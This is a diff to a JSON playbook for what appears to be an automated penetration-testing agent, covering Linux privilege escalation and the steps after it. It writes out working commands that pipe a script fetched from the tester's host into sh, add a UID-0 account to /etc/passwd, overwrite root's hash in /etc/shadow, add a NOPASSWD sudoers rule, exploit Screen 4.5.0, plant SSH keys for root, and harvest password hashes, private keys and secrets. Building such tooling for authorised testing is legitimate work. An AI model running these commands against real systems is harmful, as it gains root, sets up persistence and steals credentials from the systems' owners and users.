@@ -6,7 +6,7 @@
   "actions": [
     {
       "id": "linux-enum",
-      "title": "Local Enumeration Sweep",
+      "title": "Local Privilege Escalation Enumeration (Linux)",
       "hypothesis": "You escalate by finding things, not by recall. Kick off a scanner such as linpeas for coverage, but review its output with a purpose: hunt for the single outlier (an odd SUID bit, a writable path, a secret sitting in a config) rather than skimming the whole colorized dump. Confirm the candidate by hand before you sink time into an exploit.",
       "tool": "linpeas",
       "tools": [
@@ -23,10 +23,19 @@
         "access.admin",
         "access.system"
       ],
+      "obsoleted_by": [
+        "access.admin",
+        "objective.root_flag"
+      ],
       "produces": [
         "privesc.leads",
         "host.kernel",
         "host.arch"
+      ],
+      "settled_by": [
+        "privesc.leads",
+        "host.local_enum",
+        "host.kernel"
       ],
       "priority": 94,
       "proves": "surfaces candidate local privilege-escalation paths, the host kernel/version, and the host architecture",
@@ -43,17 +52,26 @@
         {
           "tool": "linpeas",
           "run": "curl -L http://{{lhost}}:8000/linpeas.sh | sh",
-          "note": "Host it from your own machine (a mentor can serve it for you). Add a tee so you retain a local transcript as evidence."
+          "note": "Host it from your own machine (a mentor can serve it for you). Add a tee so you retain a local transcript as evidence.",
+          "locus": "onhost"
         },
         {
           "tool": "sh",
           "run": "sudo -l && id && cat /etc/passwd | grep -E \"sh$\"",
-          "note": "The three questions that matter: what sudo is available to me, which identity I hold, and which other accounts exist."
+          "note": "The three questions that matter: what sudo is available to me, which identity I hold, and which other accounts exist.",
+          "locus": "onhost"
         },
         {
           "tool": "sh",
           "run": "find / -perm -4000 2>/dev/null; getcap -r / 2>/dev/null; ls -la /etc/cron*; crontab -l",
-          "note": "SUID files, capabilities, and cron in a single command, the three checks that most often decide a lab."
+          "note": "SUID files, capabilities, and cron in a single command, the three checks that most often decide a lab.",
+          "locus": "onhost"
+        },
+        {
+          "tool": "nxc",
+          "locus": "remote",
+          "run": "nxc ssh {{target}} -u '{{user}}' -p '{{password}}' -x 'id; uname -a; sudo -n -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null'",
+          "note": "Remote from Kali (SSH): run identity, kernel, SUID, and capability checks non-interactively over SSH."
         }
       ]
     },
@@ -68,7 +86,9 @@
       "os": [
         "linux"
       ],
-      "requires_all": [],
+      "requires_all": [
+        "foothold.linux"
+      ],
       "requires_any": [
         "privesc.sudo_rights",
         "privesc.sudo_binary",
@@ -77,6 +97,10 @@
       "deprioritize_when": [
         "access.admin",
         "access.system"
+      ],
+      "obsoleted_by": [
+        "access.admin",
+        "objective.root_flag"
       ],
       "produces": [
         "access.admin"
@@ -120,13 +144,20 @@
       "os": [
         "linux"
       ],
-      "requires_all": [],
+      "requires_all": [
+        "foothold.linux"
+      ],
       "requires_any": [
-        "privesc.passwd_writable"
+        "privesc.passwd_writable",
+        "privesc.writable_etc"
       ],
       "deprioritize_when": [
         "access.admin",
         "access.system"
+      ],
+      "obsoleted_by": [
+        "access.admin",
+        "objective.root_flag"
       ],
       "produces": [
         "access.admin"
@@ -152,8 +183,8 @@
         },
         {
           "tool": "sh",
-          "run": "echo 'r00t:HASH_FROM_OPENSSL:0:0:root:/root:/bin/bash' >> /etc/passwd",
-          "note": "Add the crafted account, then run: su r00t. Swap HASH_FROM_OPENSSL for the hash you generated."
+          "run": "echo \"r00t:$(openssl passwd -1 '{{newpass|Pass123!}}'):0:0:root:/root:/bin/bash\" >> /etc/passwd",
+          "note": "Add the crafted account with an inline openssl hash, then run: su r00t."
         }
       ]
     },
@@ -177,6 +208,10 @@
       "deprioritize_when": [
         "access.admin",
         "access.system"
+      ],
+      "obsoleted_by": [
+        "access.admin",
+        "objective.root_flag"
       ],
       "produces": [
         "access.admin"
@@ -210,7 +245,7 @@
     {
       "id": "lxc-lxd-escape",
       "title": "LXC/LXD Group Escape",
-      "hypothesis": "Being in the lxd group is root without a password: lxd lets you spin up a privileged container, bind the host filesystem inside it, and then read or write anything as root. It is among the most frequent intended privesc routes in HTB/0xdf machines. Once `id` reports lxd (or lxc), the box is effectively done, everything after is procedure.",
+      "hypothesis": "Being in the lxd group is root without a password: lxd lets you spin up a privileged container, bind the host filesystem inside it, and then read or write anything as root. It is among the most frequent intended privesc routes in Linux lab and enterprise targets. Once `id` reports lxd (or lxc), the box is effectively done, everything after is procedure.",
       "tool": "lxc",
       "tools": [
         "lxc"
@@ -225,6 +260,10 @@
       "deprioritize_when": [
         "access.admin",
         "access.system"
+      ],
+      "obsoleted_by": [
+        "access.admin",
+        "objective.root_flag"
       ],
       "produces": [
         "access.admin"
@@ -286,6 +325,10 @@
         "access.admin",
         "access.system"
       ],
+      "obsoleted_by": [
+        "access.admin",
+        "objective.root_flag"
+      ],
       "produces": [
         "access.admin"
       ],
@@ -327,17 +370,27 @@
       "os": [
         "linux"
       ],
-      "requires_all": [],
+      "requires_all": [
+        "foothold.linux"
+      ],
       "requires_any": [
-        "privesc.suid_candidate"
+        "privesc.suid_candidate",
+        "privesc.suid"
       ],
       "deprioritize_when": [
         "access.admin",
         "access.system"
       ],
+      "obsoleted_by": [
+        "access.admin",
+        "objective.root_flag"
+      ],
       "produces": [
         "access.admin",
         "privesc.leads"
+      ],
+      "settled_by": [
+        "access.admin"
       ],
       "priority": 78,
       "proves": "demonstrates administrative/root access and surfaces candidate local privilege-escalation paths",
@@ -365,7 +418,7 @@
     {
       "id": "pspy-monitor",
       "title": "Process Monitoring (pspy)",
-      "hypothesis": "Cron entries and timers execute root commands you will not find in /etc/crontab. pspy observes process creation WITHOUT needing root and exposes them: scripts sitting in writable paths, commands that leak credentials through their arguments, backup jobs open to hijack. When static enumeration dries up, watching the machine in motion is the next step, 0xdf uses pspy all the time.",
+      "hypothesis": "Cron entries and timers execute root commands you will not find in /etc/crontab. pspy observes process creation WITHOUT needing root and exposes them: scripts sitting in writable paths, commands that leak credentials through their arguments, backup jobs open to hijack. When static enumeration dries up, watching the machine in motion is the next step, making pspy an essential live-process monitor.",
       "tool": "pspy",
       "tools": [
         "pspy"
@@ -378,9 +431,23 @@
         "foothold.linux",
         "privesc.leads"
       ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
+      ],
+      "obsoleted_by": [
+        "access.admin",
+        "objective.root_flag"
+      ],
       "produces": [
         "privesc.process_lead",
         "credential.candidate"
+      ],
+      "settled_by": [
+        "privesc.cron_job",
+        "privesc.cron_writable",
+        "privesc.process_lead",
+        "privesc.leads"
       ],
       "priority": 72,
       "proves": "surfaces a process-monitoring privesc lead and candidate credentials",
@@ -408,7 +475,7 @@
     {
       "id": "cron-abuse",
       "title": "Cron Job Abuse and Tar Wildcards",
-      "hypothesis": "Two variants: (1) a root cron job executes a script you can WRITE, modify it, wait for the run, become root. (2) A root job runs tar/rsync/chown using a WILDCARD inside a directory you control, you cannot alter the command, yet you can drop files whose NAMES smuggle in options (tartarsauce: --checkpoint-action=exec). Wildcard injection is the move that catches people off guard.",
+      "hypothesis": "Two variants: (1) a root cron job executes a script you can WRITE, modify it, wait for the run, become root. (2) A root job runs tar/rsync/chown using a WILDCARD inside a directory you control, you cannot alter the command, yet you can drop files whose NAMES smuggle in options (for example, tar --checkpoint-action=exec). Wildcard injection is the move that catches people off guard.",
       "tool": "sh",
       "tools": [
         "sh"
@@ -424,6 +491,10 @@
       "deprioritize_when": [
         "access.admin",
         "access.system"
+      ],
+      "obsoleted_by": [
+        "access.admin",
+        "objective.root_flag"
       ],
       "produces": [
         "access.admin"
@@ -467,17 +538,27 @@
       "os": [
         "linux"
       ],
-      "requires_all": [],
+      "requires_all": [
+        "foothold.linux"
+      ],
       "requires_any": [
-        "privesc.capability"
+        "privesc.capability",
+        "privesc.capabilities"
       ],
       "deprioritize_when": [
         "access.admin",
         "access.system"
       ],
+      "obsoleted_by": [
+        "access.admin",
+        "objective.root_flag"
+      ],
       "produces": [
         "access.admin",
         "loot.files"
+      ],
+      "settled_by": [
+        "access.admin"
       ],
       "priority": 78,
       "proves": "demonstrates administrative/root access and recovers files",
@@ -541,17 +622,26 @@
         {
           "tool": "sh",
           "run": "cat ~/.bash_history; ls -la /home/*/; cat /home/*/.bash_history 2>/dev/null",
-          "note": "History files: commands leak passwords supplied as arguments, along with paths and other hosts."
+          "note": "History files: commands leak passwords supplied as arguments, along with paths and other hosts.",
+          "locus": "onhost"
         },
         {
           "tool": "sh",
           "run": "grep -rniE 'passw|secret|token|api[_-]?key' /etc /opt /var/www /srv 2>/dev/null | grep -v Binary | head -50",
-          "note": "A config-grep sweep. /var/www configs carry DB credentials; /opt holds backup scripts with baked-in passwords."
+          "note": "A config-grep sweep. /var/www configs carry DB credentials; /opt holds backup scripts with baked-in passwords.",
+          "locus": "onhost"
         },
         {
           "tool": "sh",
           "run": "ls -la /var/mail/ /tmp /dev/shm /var/backups 2>/dev/null; find / -name '*.kdbx' -o -name 'id_rsa' -o -name '*.bak' 2>/dev/null | grep -v '^/proc'",
-          "note": "Mail spools (the beep pattern), temp directories, backups, key files, KeePass databases."
+          "note": "Mail spools (the beep pattern), temp directories, backups, key files, KeePass databases.",
+          "locus": "onhost"
+        },
+        {
+          "tool": "nxc",
+          "locus": "remote",
+          "run": "nxc ssh {{target}} -u '{{user}}' -p '{{password}}' -x 'cat ~/.bash_history /home/*/.bash_history 2>/dev/null; grep -rniE \"passw|secret|token|api[_-]?key\" /etc /opt /var/www /srv 2>/dev/null | head -50'",
+          "note": "Remote from Kali (SSH): sweep shell history and configuration directories for cleartext credentials over SSH."
         }
       ]
     },
@@ -587,7 +677,7 @@
         {
           "tool": "sh",
           "run": "mkdir -p /root/.ssh && echo 'ssh-ed25519 AAAA... your-public-key' >> /root/.ssh/authorized_keys",
-          "note": "A common pattern in the field (admirer, brainfuck, armageddon). Create the keypair on YOUR machine first: ssh-keygen -t ed25519."
+          "note": "A common pattern in the field when home directories are writable. Create the keypair on YOUR machine first: ssh-keygen -t ed25519."
         },
         {
           "tool": "sh",
@@ -658,7 +748,12 @@
         "foothold.linux"
       ],
       "deprioritize_when": [
-        "access.admin"
+        "access.admin",
+        "access.system"
+      ],
+      "obsoleted_by": [
+        "access.admin",
+        "objective.root_flag"
       ]
     },
     {
@@ -677,6 +772,7 @@
       ],
       "requires_any": [
         "privesc.suid_candidate",
+        "privesc.suid",
         "privesc.cron",
         "privesc.cron_writable"
       ],
@@ -721,7 +817,12 @@
         "foothold.linux"
       ],
       "deprioritize_when": [
-        "access.admin"
+        "access.admin",
+        "access.system"
+      ],
+      "obsoleted_by": [
+        "access.admin",
+        "objective.root_flag"
       ]
     },
     {
@@ -781,7 +882,12 @@
         "foothold.linux"
       ],
       "deprioritize_when": [
-        "access.admin"
+        "access.admin",
+        "access.system"
+      ],
+      "obsoleted_by": [
+        "access.admin",
+        "objective.root_flag"
       ]
     },
     {
@@ -853,7 +959,12 @@
         "foothold.linux"
       ],
       "deprioritize_when": [
-        "access.admin"
+        "access.admin",
+        "access.system"
+      ],
+      "obsoleted_by": [
+        "access.admin",
+        "objective.root_flag"
       ]
     },
     {
@@ -872,7 +983,9 @@
       ],
       "speculative": true,
       "requires_any": [
-        "foothold.linux"
+        "privesc.systemd_timer",
+        "privesc.cron_writable",
+        "privesc.leads"
       ],
       "produces": [
         "access.admin"
@@ -911,9 +1024,16 @@
           "note": "Reload and start it, or wait for its timer; uid=0 confirms root."
         }
       ],
-      "requires_all": [],
+      "requires_all": [
+        "foothold.linux"
+      ],
       "deprioritize_when": [
-        "access.admin"
+        "access.admin",
+        "access.system"
+      ],
+      "obsoleted_by": [
+        "access.admin",
+        "objective.root_flag"
       ]
     },
     {
@@ -938,6 +1058,10 @@
       "deprioritize_when": [
         "access.admin",
         "access.system"
+      ],
+      "obsoleted_by": [
+        "access.admin",
+        "objective.root_flag"
       ],
       "produces": [
         "access.admin"
@@ -1044,7 +1168,12 @@
         "foothold.linux"
       ],
       "deprioritize_when": [
-        "access.admin"
+        "access.admin",
+        "access.system"
+      ],
+      "obsoleted_by": [
+        "access.admin",
+        "objective.root_flag"
       ]
     },
     {
@@ -1063,7 +1192,11 @@
         "kubectl"
       ],
       "requires_any": [
-        "foothold.linux"
+        "privesc.container",
+        "privesc.docker_group",
+        "privesc.capability",
+        "privesc.capabilities",
+        "privesc.leads"
       ],
       "produces": [
         "access.admin"
@@ -1102,9 +1235,16 @@
           "note": "A permissive service-account token lets you create a privileged pod that mounts the host filesystem."
         }
       ],
-      "requires_all": [],
+      "requires_all": [
+        "foothold.linux"
+      ],
       "deprioritize_when": [
-        "access.admin"
+        "access.admin",
+        "access.system"
+      ],
+      "obsoleted_by": [
+        "access.admin",
+        "objective.root_flag"
       ]
     },
     {
@@ -1129,6 +1269,10 @@
       "deprioritize_when": [
         "access.admin",
         "access.system"
+      ],
+      "obsoleted_by": [
+        "access.admin",
+        "objective.root_flag"
       ],
       "produces": [
         "access.admin"
@@ -1183,6 +1327,10 @@
       "deprioritize_when": [
         "access.admin",
         "access.system"
+      ],
+      "obsoleted_by": [
+        "access.admin",
+        "objective.root_flag"
       ],
       "produces": [
         "access.admin"
@@ -1239,6 +1387,10 @@
         "access.admin",
         "access.system"
       ],
+      "obsoleted_by": [
+        "access.admin",
+        "objective.root_flag"
+      ],
       "produces": [
         "access.admin"
       ],
@@ -1294,18 +1446,22 @@
         "foothold.linux"
       ],
       "requires_any": [
-        "privesc.cron",
-        "privesc.cron_wildcard",
-        "privesc.cron_writable"
+        "privesc.cron_wildcard"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "loot.shadow"
       ],
       "obsoleted_by": [
+        "access.admin",
         "objective.root_flag"
       ],
       "produces": [
-        "objective.root_flag",
-        "credential.candidate"
+        "loot.files",
+        "credential.candidate",
+        "objective.root_flag"
       ],
-      "priority": 82,
+      "priority": 70,
       "proves": "coerces privileged archive processes to follow symlinks and exfiltrate root-only files into an accessible archive",
       "does_not_prove": "direct root command execution, only arbitrary file read",
       "report": {
@@ -1406,13 +1562,12 @@
       ],
       "requires_any": [
         "privesc.group_lxd",
-        "privesc.lxd_group",
         "privesc.container_group"
       ],
       "produces": [
         "access.admin"
       ],
-      "priority": 85,
+      "priority": 72,
       "autonomy": "approve",
       "sequence": true,
       "proves": "root host filesystem access via privileged LXD container mount",
@@ -1447,7 +1602,12 @@
         }
       ],
       "deprioritize_when": [
-        "access.admin"
+        "access.admin",
+        "access.system"
+      ],
+      "obsoleted_by": [
+        "access.admin",
+        "objective.root_flag"
       ]
     },
     {
@@ -1508,9 +1668,12 @@
         "linux"
       ],
       "speculative": true,
-      "requires_all": [],
-      "requires_any": [
+      "requires_all": [
         "foothold.linux"
+      ],
+      "requires_any": [
+        "privesc.process_lead",
+        "privesc.leads"
       ],
       "produces": [
         "access.admin"
@@ -1537,7 +1700,12 @@
         }
       ],
       "deprioritize_when": [
-        "access.admin"
+        "access.admin",
+        "access.system"
+      ],
+      "obsoleted_by": [
+        "access.admin",
+        "objective.root_flag"
       ]
     },
     {
@@ -1561,6 +1729,10 @@
       "deprioritize_when": [
         "access.admin",
         "access.system"
+      ],
+      "obsoleted_by": [
+        "access.admin",
+        "objective.root_flag"
       ],
       "produces": [
         "access.admin"
@@ -1615,6 +1787,10 @@
         "access.admin",
         "access.system"
       ],
+      "obsoleted_by": [
+        "access.admin",
+        "objective.root_flag"
+      ],
       "produces": [
         "access.admin"
       ],
@@ -1666,6 +1842,10 @@
         "access.admin",
         "access.system"
       ],
+      "obsoleted_by": [
+        "access.admin",
+        "objective.root_flag"
+      ],
       "produces": [
         "access.admin"
       ],
@@ -1691,6 +1871,126 @@
           "tool": "screen",
           "run": "cd /etc && umask 000 && screen-4.5.0 -D -m -L ld.so.preload echo -ne \"\\x0a/tmp/libhax.so\" && screen-4.5.0 -ls; /tmp/rootshell",
           "note": "Exploit Screen 4.5.0 setuid logfile creation to inject libhax.so into /etc/ld.so.preload and execute dropped rootshell binary."
+        }
+      ]
+    },
+    {
+      "id": "writable-etc-shadow-sudoers",
+      "transition": "privesc_act",
+      "title": "Writable /etc/shadow or /etc/sudoers Direct Root Escalation",
+      "phase": "escalate",
+      "hypothesis": "When /etc/shadow or /etc/sudoers (or /etc/sudoers.d) has weak group or world-writable permissions, an unprivileged user can either read and replace the root password hash directly in /etc/shadow using openssl passwd -6, or append a NOPASSWD rule to /etc/sudoers for immediate root elevation.",
+      "tool": "sh",
+      "tools": [
+        "sh",
+        "openssl",
+        "sudo"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [
+        "foothold.linux"
+      ],
+      "requires_any": [
+        "privesc.writable_etc"
+      ],
+      "produces": [
+        "access.admin",
+        "loot.shadow"
+      ],
+      "settled_by": [
+        "access.admin"
+      ],
+      "obsoleted_by": [
+        "access.admin",
+        "objective.root_flag"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
+      ],
+      "priority": 92,
+      "proves": "demonstrates direct root privilege escalation by modifying writable /etc/shadow or /etc/sudoers",
+      "does_not_prove": "privilege escalation if /etc/sudoers has invalid permissions (0666 breaks sudo unless pkexec/su is used on /etc/shadow)",
+      "report": {
+        "finding": "Writable /etc/shadow or /etc/sudoers Grants Root",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "ls -la /etc/shadow /etc/sudoers /etc/sudoers.d && head -n 5 /etc/shadow",
+          "note": "Confirm write permissions on /etc/shadow or /etc/sudoers and dump existing root hash for backup/cracking."
+        },
+        {
+          "tool": "sh",
+          "run": "sed -i \"s|^root:[^:]*:|root:$(openssl passwd -6 '{{newpass|Pass123!}}'):|\" /etc/shadow && su - root",
+          "note": "Replace root's password hash in writable /etc/shadow with a known SHA-512 crypt hash and switch to root."
+        },
+        {
+          "tool": "sh",
+          "run": "echo '{{user}} ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/{{user}} && chmod 0440 /etc/sudoers.d/{{user}} && sudo su -",
+          "note": "Append a NOPASSWD rule in writable /etc/sudoers.d (maintaining 0440 permissions so sudo accepts the file) and elevate."
+        }
+      ]
+    },
+    {
+      "id": "linux-root-cred-harvest",
+      "title": "Root-Level Shadow, SSH Key & Config Credential Harvest",
+      "phase": "loot",
+      "hypothesis": "Once root access is achieved on a Linux host, harvesting /etc/shadow hashes, root and user SSH private keys, .bash_history files, and application database credentials enables lateral movement to adjacent internal hosts via password or key reuse.",
+      "tool": "sh",
+      "tools": [
+        "sh",
+        "unshadow",
+        "find"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "access.admin"
+      ],
+      "produces": [
+        "loot.shadow",
+        "loot.files",
+        "credential.candidate"
+      ],
+      "settled_by": [
+        "loot.shadow",
+        "loot.files",
+        "credential.candidate"
+      ],
+      "deprioritize_when": [
+        "objective.root_flag"
+      ],
+      "priority": 72,
+      "proves": "extracts /etc/shadow password hashes, SSH private keys, and shell history from a compromised Linux host as root",
+      "does_not_prove": "lateral authentication until extracted keys or cracked shadow hashes are validated on another host",
+      "report": {
+        "finding": "Post-Compromise Root Credential & Shadow Harvest",
+        "severity": "info"
+      },
+      "refs": [
+        "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "unshadow /etc/passwd /etc/shadow > shadow.hashes && cat /etc/shadow",
+          "note": "PREFERRED: Combine /etc/passwd and /etc/shadow for offline cracking and print /etc/shadow so the parser extracts all local user password hashes.",
+          "locus": "onhost"
+        },
+        {
+          "tool": "sh",
+          "run": "find /root /home -maxdepth 3 \\( -name \"id_rsa\" -o -name \"id_ed25519\" -o -name \".bash_history\" \\) -exec head -n 50 {} + 2>/dev/null",
+          "note": "Sweep /root and /home for SSH private keys and command history containing lateral movement credentials.",
+          "locus": "onhost"
         }
       ]
     }
